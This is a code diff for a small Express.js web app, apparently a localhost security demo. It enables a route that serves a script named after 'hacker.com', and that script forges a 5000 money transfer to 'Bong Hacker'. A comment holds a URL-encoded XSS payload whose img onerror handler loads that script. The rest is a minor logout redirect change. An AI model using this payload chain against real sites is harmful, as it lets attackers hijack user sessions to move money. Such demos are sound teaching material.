@@ -49,10 +49,10 @@ app.get('/user', (req, res) => {
 
 
 // // http://localhost:3000/search?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost:3000%2Fhacker.com%2Fxss.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E
-// app.get('/hacker.com/xss.js', (req, res) => {
-//   res.set('Content-Type', 'application/javascript');
-//   res.send (`const body=new URLSearchParams('amount=5000&description=Thank%20You&to=Bong%20Hacker');fetch('/transfer',{body,method:'post'})`)
-// })
+app.get('/hacker.com/xss.js', (req, res) => {
+  res.set('Content-Type', 'application/javascript');
+  res.send (`const body=new URLSearchParams('amount=5000&remark=Thank%20You&username=Bong%20Hacker');fetch('/transfer',{body,method:'post'})`)
+})
 
 app.get('*', (req, res) => {
   res.redirect('/');
@@ -76,7 +76,7 @@ app.post('/logout', (req, res) => {
   
   db.logout(session);
 
-  res.status(301).redirect('/login');
+  res.status(301).redirect('/');
 });
 
 // Auth middleware
